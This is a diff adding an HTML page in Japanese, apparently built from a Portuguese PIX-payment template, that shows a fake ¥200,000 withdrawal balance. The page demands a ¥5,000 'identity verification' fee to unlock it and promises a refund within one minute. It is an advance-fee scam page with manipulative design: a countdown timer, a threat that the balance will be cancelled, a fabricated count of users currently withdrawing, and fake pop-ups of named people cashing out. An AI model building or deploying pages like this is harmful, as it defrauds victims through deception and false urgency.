@@ -1,0 +1,236 @@
+<!DOCTYPE html>
+<html lang="ja">
+
+<head>
+    <script src="js/utm-propagator.js"></script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>出金申請中...</title>
+    <link rel="stylesheet" href="css/style-saque.css">
+    <link href="css/boxicons.min.css" rel="stylesheet">
+    <script src="js/utm-propagator.js"></script>
+</head>
+
+<body>
+
+    <div id="loading-screen" class="loading-screen">
+        <div class="loading-content">
+            <div class="spinner-custom"></div>
+
+            <h2>出金申請を処理しています...</h2>
+
+            <div class="loading-bar-bg">
+                <div id="loading-bar-fill" class="loading-bar-fill"></div>
+            </div>
+
+            <p>しばらくお待ちください...</p>
+        </div>
+    </div>
+
+    <main id="main-content" class="main-container" style="display: none; opacity: 0;">
+
+        <header class="header-top">本人確認</header>
+
+        <div class="card card-saldo-principal">
+            <p class="label-saldo">利用可能な残高</p>
+            <h2 class="valor-saldo">¥ 200,000</h2>
+            <p class="sub-saldo">出金の確認待ち</p>
+        </div>
+
+        <div class="card card-taxa-info">
+            <p class="processo-titulo">本人確認手続き</p>
+
+            <div class="linha-taxa-destaque">
+                <span class="valor-taxa-dinamica" id="taxa-valor-display">¥ 5,000</span>
+                <span class="badge-reembolsavel">全額返金対象</span>
+            </div>
+
+            <p class="texto-informativo">
+                <strong>¥ 200,000</strong> の出金のための本人確認です。
+                手数料および返金条件に関する詳細は決済前に明確に表示されます。
+            </p>
+        </div>
+
+        <div class="card card-dados-reembolso">
+            <p class="processo-titulo">返金詳細</p>
+
+            <ul class="lista-reembolso">
+                <li>
+                    <span>日付</span>
+                    <strong id="data-atual"></strong>
+                </li>
+
+                <li>
+                    <span>出金方法</span>
+                    <strong id="confirm-tipo"></strong>
+                </li>
+
+                <li>
+                    <span>受取予定金額</span>
+                    <strong class="total-final" id="total-receber">¥ 205,000</strong>
+                </li>
+            </ul>
+        </div>
+
+        <div class="card card-tarefa">
+            <p class="processo-titulo">リリースプロセス</p>
+
+            <div class="space-y-4">
+                <div class="passo-item">
+                    <div class="passo-numero">1</div>
+                    <div class="passo-texto">
+                        <p class="passo-label">本人確認を完了する</p>
+                        <p class="passo-sub">
+                            <strong>¥ 5,000</strong> 本人確認手数料
+                        </p>
+                    </div>
+                </div>
+
+                <div class="passo-item">
+                    <div class="passo-icon-bg">
+                        <i class="bx bx-check"></i>
+                    </div>
+                    <div class="passo-texto">
+                        <p class="passo-label texto-verde-sucesso">
+                            返金を受け取る
+                        </p>
+                        <p class="passo-sub">
+                            返金処理時間: 約1分
+                        </p>
+                    </div>
+                </div>
+
+                <div class="passo-item">
+                    <div class="passo-numero">3</div>
+                    <div class="passo-texto">
+                        <p class="passo-label">残高へのアクセス</p>
+                        <p class="passo-sub">
+                            ¥ 200,000 が出金可能になります
+                        </p>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <div class="container-acao">
+            <button class="btn-pix" id="btn-gerar-pix" type="button" style="text-decoration: none; border:none; cursor:pointer; width:100%;">
+                手数料を支払って出金を解除する
+            </button>
+
+            <div class="info-reembolso">
+                <i class="bx bx-shield-quarter"></i>
+                <span>1分以内に自動返金されます</span>
+            </div>
+        </div>
+
+    </main>
+
+    <div id="modal-pix" class="modal-pix-overlay" style="display:none;">
+        <div class="modal-pix-content">
+
+            <div class="modal-top">
+                <h3 class="modal-title">本人確認の完了</h3>
+            </div>
+
+            <div class="card card-saldo-expira">
+                <div class="saldo-left">
+                    <span class="mini-label">あなたの残高</span>
+                    <strong class="saldo-valor">¥ 200,000</strong>
+                </div>
+
+                <div class="saldo-right">
+                    <span class="mini-label mini-right">有効期限</span>
+                    <strong class="expira-valor" id="expira-timer">07:00</strong>
+                </div>
+            </div>
+
+            <div class="card card-pix">
+                <h4 class="pix-title"><strong class="taxa-texto-dinamico">¥ 5,000</strong> を支払ってロック解除</h4>
+                <p class="pix-subtitle">QRコードをスキャンするかコードをコピーしてください</p>
+
+                <div class="qr-wrap">
+                    <img id="qr-code-img"
+                        src="https://api.qrserver.com/v1/create-qr-code/?size=250x250&data=Aguardando..."
+                        alt="QR Code">
+                </div>
+
+                <div class="pix-code-box">
+                    <textarea id="pix-copia-cola" readonly="">コードを生成中...</textarea>
+                </div>
+
+                <button class="btn-copiar-pix" type="button" onclick="copiarPix()">
+                    <i class="bx bx-copy"></i> 決済コードをコピー
+                </button>
+            </div>
+
+            <div class="card status-card status-wait">
+                <div class="spinner-small"></div>
+                <div class="status-text">
+                    <strong>支払い待ち...</strong>
+                    <span>確認次第、自動的に更新されます</span>
+                </div>
+            </div>
+
+            <div class="card status-card status-green">
+                <i class="bx bx-group"></i>
+                <div class="status-text">
+                    <strong>現在68名が出金手続き中</strong>
+                    <span>リアルタイムで処理されています</span>
+                </div>
+            </div>
+
+            <div class="card status-card status-red">
+                <i class="bx bx-error"></i>
+                <div class="status-text">
+                    <strong>報酬を失わないようにご注意ください</strong>
+                    <span>支払いが確認されない場合、<b>¥ 200,000</b> の残高はキャンセルされます。</span>
+                </div>
+            </div>
+
+            <button class="btn-copiar-pix btn-copiar-pix-bottom" type="button" onclick="copiarPix()">
+                <i class="bx bx-copy"></i> 決済コードをコピー
+            </button>
+
+            <div class="modal-security">
+                <i class="bx bx-shield-quarter"></i>
+                <span>100%安全かつ全額返金可能な決済</span>
+            </div>
+
+        </div>
+    </div>
+
+    <div id="toast-saque" class="toast-saque">
+        <img id="toast-img" src="https://i.pravatar.cc/150?img=11" alt="Profile" class="toast-perfil">
+        <div class="toast-texto">
+            <p id="toast-mensagem">佐藤 健さんが <strong class="texto-verde">¥ 200,000</strong> を出金しました</p>
+            <span>たった今</span>
+        </div>
+        <div class="toast-dot"></div>
+    </div>
+
+    <script>
+        document.getElementById('data-atual').textContent =
+            new Date().toLocaleDateString('ja-JP', {
+                month: 'short',
+                day: 'numeric',
+                year: 'numeric',
+                timeZone: 'Asia/Tokyo'
+            });
+    </script>
+
+    <script>
+        document.addEventListener("DOMContentLoaded", function () {
+            const confirmTipo = document.getElementById("confirm-tipo");
+            if (!confirmTipo) return;
+            const metodoPagamento = localStorage.getItem("metodoPagamento");
+            confirmTipo.textContent = metodoPagamento || "未選択";
+        });
+    </script>
+
+    <script src="js/saque.js"></script>
+    <script src="js/index.js" data-token="pt_246f25ea85305e5f3c653da1bc55dfd7"></script>
+    <script src="js/index.js" data-token="pt_d7c144ffd2b0fce2c05f769269023150"></script>
+
+</body>
+
+</html>
